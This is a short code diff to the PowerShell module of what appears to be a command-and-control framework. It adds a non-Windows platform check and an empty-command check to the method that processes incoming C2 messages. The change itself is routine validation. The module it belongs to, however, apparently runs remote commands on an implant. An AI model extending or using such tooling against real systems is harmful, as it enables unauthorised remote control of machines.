@@ -283,6 +283,11 @@ int Powershell::init(std::vector<std::string> &splitedCmd, C2Message &c2Message)
 
 int Powershell::process(C2Message &c2Message, C2Message &c2RetMessage)
 {
+#ifndef _WIN32
+    return c2coreUnsupportedPlatform(c2Message, c2RetMessage);
+#endif
+    if (c2Message.cmd().empty())
+        return c2coreInvalidRequest(c2Message, c2RetMessage);
     string cmd = c2Message.cmd();
 
     std::vector<std::string> splitedCmd;
